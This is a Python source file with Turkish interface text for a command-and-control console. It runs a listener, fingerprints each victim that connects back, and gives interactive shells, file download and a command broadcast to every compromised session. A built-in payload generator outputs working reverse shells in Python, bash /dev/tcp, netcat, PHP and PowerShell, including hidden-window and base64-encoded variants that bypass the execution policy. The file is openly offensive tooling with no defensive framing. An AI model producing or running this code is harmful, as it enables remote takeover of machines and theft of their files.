import socket
import threading
import time
import os
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

console = Console()

sessions = {}
listener_thread = None
listener_running = False
listener_sock = None
server_host = None
server_port = None


def start_listener(host, port):
    global listener_running, listener_sock, server_host, server_port

    try:
        listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener_sock.settimeout(1.0)
        listener_sock.bind((host, port))
        listener_sock.listen(10)
        listener_running = True
        server_host = host
        server_port = port
        console.print(f"\n[#a78bfa]  🌕 Listener aktif: {host}:{port}[/#a78bfa]")
        console.print(f"[dim]  Baglanti bekleniyor...[/dim]")

        while listener_running:
            try:
                conn, addr = listener_sock.accept()
                sid = len(sessions) + 1

                try:
                    conn.settimeout(3)
                    conn.send(b"whoami && hostname\n")
                    info_data = conn.recv(4096).decode("utf-8", errors="replace").strip()
                except Exception:
                    info_data = "Bilinmiyor"

                sessions[sid] = {
                    "conn": conn,
                    "addr": addr,
                    "connected_at": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "info": info_data,
                    "alive": True,
                    "cmds": 0
                }
                console.print(f"\n[bold #a78bfa]  🌕 Session #{sid} | {addr[0]}:{addr[1]} | {info_data.split(chr(10))[0]}[/bold #a78bfa]")

            except socket.timeout:
                continue
            except OSError:
                break

    except OSError as e:
        console.print(f"[red]  Port kullanimda veya hata: {e}[/red]")
    except Exception as e:
        console.print(f"[red]  Listener hatasi: {e}[/red]")
    finally:
        listener_running = False


def stop_listener():
    global listener_running, listener_sock
    listener_running = False
    if listener_sock:
        try:
            listener_sock.close()
        except Exception:
            pass
        listener_sock = None
    console.print("[#a78bfa]  Listener durduruldu.[/#a78bfa]")


def list_sessions():
    table = Table(title="🌕 C2 Sessions", border_style="purple", show_header=True, header_style="bold magenta")
    table.add_column("ID", style="bold #a78bfa", justify="center", width=4)
    table.add_column("IP Adresi", style="white", min_width=16)
    table.add_column("Port", style="dim", justify="center", width=6)
    table.add_column("Sistem", style="#a78bfa", min_width=16)
    table.add_column("Baglanti", style="dim", width=19)
    table.add_column("Komut", style="dim", justify="center", width=5)
    table.add_column("Durum", style="bold", justify="center", width=7)

    if not sessions:
        console.print("[dim]  Aktif session yok.[/dim]")
        return

    for sid, info in sessions.items():
        alive = "[#a78bfa]AKTIF[/#a78bfa]" if info["alive"] else "[red]KAPALI[/red]"
        sys_info = info["info"].split("\n")[0][:20] if info["info"] else "-"
        table.add_row(
            str(sid), info["addr"][0], str(info["addr"][1]),
            sys_info, info["connected_at"],
            str(info["cmds"]), alive
        )

    console.print()
    console.print(table)

    active = sum(1 for s in sessions.values() if s["alive"])
    console.print(f"\n[dim]  Toplam: {len(sessions)}  |  Aktif: {active}  |  Kapali: {len(sessions) - active}[/dim]")


def interact_session(sid):
    if sid not in sessions:
        console.print("[red]  Session bulunamadi.[/red]")
        return

    info = sessions[sid]
    if not info["alive"]:
        console.print("[red]  Session aktif degil.[/red]")
        return

    conn = info["conn"]
    ip = info["addr"][0]

    console.print(Panel(
        f"[bold white]Session:[/bold white] #{sid}\n"
        f"[bold white]IP:[/bold white] {ip}:{info['addr'][1]}\n"
        f"[bold white]Sistem:[/bold white] {info['info'].split(chr(10))[0]}\n"
        f"[bold white]Baglanti:[/bold white] {info['connected_at']}",
        title="🌕 Shell",
        border_style="purple",
        padding=(0, 2)
    ))
    console.print("[dim]  Komutlar: 'back' (cik), 'download [dosya]'[/dim]")

    while True:
        try:
            cmd = console.input(f"[bold magenta]  {ip} [/bold magenta][bold white]$ [/bold white]").strip()

            if not cmd:
                continue
            if cmd.lower() == "back":
                break

            if cmd.lower().startswith("download "):
                remote_file = cmd[9:].strip()
                local_file = os.path.basename(remote_file)
                conn.send(f"type {remote_file}\n".encode() if os.name == "nt" else f"cat {remote_file}\n".encode())
                conn.settimeout(10)
                data = b""
                while True:
                    try:
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        data += chunk
                        if len(chunk) < 65536:
                            break
                    except socket.timeout:
                        break
                with open(local_file, "wb") as f:
                    f.write(data)
                console.print(f"[#a78bfa]  Indirildi: {local_file} ({len(data)} bytes)[/#a78bfa]")
                info["cmds"] += 1
                continue

            conn.send((cmd + "\n").encode("utf-8"))
            conn.settimeout(5)
            info["cmds"] += 1

            response = b""
            while True:
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < 4096:
                        break
                except socket.timeout:
                    break

            if response:
                output = response.decode("utf-8", errors="replace")
                if len(output) > 2000:
                    output = output[:2000] + "\n... (kesildi)"
                console.print(Panel(output, border_style="#4a2c8a", padding=(0, 1)))
            else:
                console.print("[dim]  Yanit yok.[/dim]")

        except (ConnectionResetError, BrokenPipeError, OSError):
            console.print("[red]  Baglanti koptu.[/red]")
            info["alive"] = False
            break
        except KeyboardInterrupt:
            break


def kill_session(sid):
    if sid not in sessions:
        console.print("[red]  Session bulunamadi.[/red]")
        return
    try:
        sessions[sid]["conn"].close()
    except Exception:
        pass
    sessions[sid]["alive"] = False
    console.print(f"[#a78bfa]  Session #{sid} kapatildi.[/#a78bfa]")


def kill_all():
    count = 0
    for sid in sessions:
        if sessions[sid]["alive"]:
            try:
                sessions[sid]["conn"].close()
            except Exception:
                pass
            sessions[sid]["alive"] = False
            count += 1
    console.print(f"[#a78bfa]  {count} session kapatildi.[/#a78bfa]")


def broadcast_command(cmd):
    results = []
    for sid, info in sessions.items():
        if not info["alive"]:
            continue
        try:
            info["conn"].send((cmd + "\n").encode("utf-8"))
            info["conn"].settimeout(3)
            resp = b""
            while True:
                try:
                    chunk = info["conn"].recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(chunk) < 4096:
                        break
                except socket.timeout:
                    break
            results.append((sid, info["addr"][0], resp.decode("utf-8", errors="replace")[:200]))
            info["cmds"] += 1
        except Exception:
            info["alive"] = False
            results.append((sid, info["addr"][0], "[HATA]"))

    if results:
        table = Table(title="🌕 Broadcast Sonuclari", border_style="purple", show_header=True, header_style="bold magenta")
        table.add_column("ID", justify="center", width=4, style="bold #a78bfa")
        table.add_column("IP", style="white", width=16)
        table.add_column("Cikti", style="#a78bfa")
        for sid, ip, out in results:
            table.add_row(str(sid), ip, out.strip()[:60])
        console.print()
        console.print(table)
    else:
        console.print("[dim]  Aktif session yok.[/dim]")


def generate_payload():
    console.print()
    console.print(f"  [bold purple]🌙 PAYLOAD OLUSTURUCU[/bold purple]")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
    console.print(f"   [#a78bfa][1][/#a78bfa] Python Reverse Shell")
    console.print(f"   [#a78bfa][2][/#a78bfa] PowerShell Reverse Shell")
    console.print(f"   [#a78bfa][3][/#a78bfa] Bash Reverse Shell")
    console.print(f"   [#a78bfa][4][/#a78bfa] Netcat Reverse Shell")
    console.print(f"   [#a78bfa][5][/#a78bfa] PHP Reverse Shell")
    console.print(f"   [#a78bfa][6][/#a78bfa] PowerShell Encoded (Base64)")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

    choice = console.input("\n[bold white]  Secim: [/bold white]").strip()

    if server_host and server_port:
        use_current = console.input(f"[bold white]  Mevcut listener kullan ({server_host}:{server_port})? (e/h): [/bold white]").strip().lower()
        if use_current == "e":
            host = server_host
            port = str(server_port)
        else:
            host = console.input("[bold white]  LHOST: [/bold white]").strip()
            port = console.input("[bold white]  LPORT: [/bold white]").strip()
    else:
        host = console.input("[bold white]  LHOST: [/bold white]").strip()
        port = console.input("[bold white]  LPORT: [/bold white]").strip()

    if not host or not port:
        console.print("[red]  IP ve port gerekli.[/red]")
        return

    payloads = {
        "1": f'''import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe"] if os.name=="nt" else ["/bin/sh","-i"])''',
        "2": f'''powershell -nop -W hidden -noni -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::UTF8).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"''',
        "3": f'''bash -i >& /dev/tcp/{host}/{port} 0>&1''',
        "4": f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f''',
        "5": f'''php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
        "6": None,
    }

    if choice == "6":
        import base64
        ps_cmd = f"$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::UTF8).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
        encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
        payload = f"powershell -nop -W hidden -enc {encoded}"
    else:
        payload = payloads.get(choice)

    if payload:
        console.print(Panel(payload, title="🌕 Payload", border_style="purple", padding=(1, 2)))

        save = console.input("[bold white]  Dosyaya kaydet? (e/h): [/bold white]").strip().lower()
        if save == "e":
            ext_map = {"1": "py", "2": "ps1", "3": "sh", "4": "sh", "5": "php", "6": "ps1"}
            fname = f"payload_{int(time.time())}.{ext_map.get(choice, 'txt')}"
            with open(fname, "w") as f:
                f.write(payload)
            console.print(f"[#a78bfa]  Kaydedildi: {os.path.abspath(fname)}[/#a78bfa]")
    else:
        console.print("[red]  Gecersiz secim.[/red]")


def run():
    global listener_thread

    while True:
        console.print()
        console.print(f"  [bold purple]🌙 C2 SHELL[/bold purple]")
        console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

        status = "[#a78bfa]AKTIF[/#a78bfa]" if listener_running else "[red]KAPALI[/red]"
        addr = f"{server_host}:{server_port}" if listener_running else "-"
        active = sum(1 for s in sessions.values() if s["alive"])

        console.print(f"   Listener: {status}  |  Adres: {addr}  |  Sessions: {active}")
        console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
        console.print(f"   [#a78bfa]listen[/#a78bfa] [IP] [PORT]    Listener baslat")
        console.print(f"   [#a78bfa]stop[/#a78bfa]                  Listener durdur")
        console.print(f"   [#a78bfa]sessions[/#a78bfa]              Session listesi")
        console.print(f"   [#a78bfa]interact[/#a78bfa] [ID]         Shell etkilesim")
        console.print(f"   [#a78bfa]kill[/#a78bfa] [ID]             Session kapat")
        console.print(f"   [#a78bfa]killall[/#a78bfa]               Tum session kapat")
        console.print(f"   [#a78bfa]broadcast[/#a78bfa] [CMD]       Tum session'lara komut")
        console.print(f"   [#a78bfa]payload[/#a78bfa]               Payload olustur")
        console.print(f"   [#a78bfa]back[/#a78bfa]                  Geri don")
        console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

        try:
            cmd = console.input("\n[bold magenta]  c2 [/bold magenta][bold white]> [/bold white]").strip()
            parts = cmd.split(maxsplit=1)
            if not parts:
                continue

            action = parts[0].lower()

            if action == "back":
                break

            elif action == "listen":
                if listener_running:
                    console.print("[yellow]  Listener zaten calisiyor. Once 'stop' yapin.[/yellow]")
                    continue
                args = parts[1].split() if len(parts) > 1 else []
                host = args[0] if len(args) > 0 else "0.0.0.0"
                port = int(args[1]) if len(args) > 1 else 4444
                listener_thread = threading.Thread(target=start_listener, args=(host, port), daemon=True)
                listener_thread.start()
                time.sleep(0.8)

            elif action == "stop":
                stop_listener()

            elif action == "sessions":
                list_sessions()

            elif action == "interact":
                if len(parts) < 2:
                    console.print("[red]  Kullanim: interact [ID][/red]")
                    continue
                interact_session(int(parts[1].strip()))

            elif action == "kill":
                if len(parts) < 2:
                    console.print("[red]  Kullanim: kill [ID][/red]")
                    continue
                kill_session(int(parts[1].strip()))

            elif action == "killall":
                kill_all()

            elif action == "broadcast":
                if len(parts) < 2:
                    console.print("[red]  Kullanim: broadcast [KOMUT][/red]")
                    continue
                broadcast_command(parts[1])

            elif action == "payload":
                generate_payload()

            else:
                console.print("[red]  Bilinmeyen komut.[/red]")

        except KeyboardInterrupt:
            break
        except ValueError:
            console.print("[red]  Gecersiz deger.[/red]")
        except Exception as e:
            console.print(f"[red]  Hata: {e}[/red]")
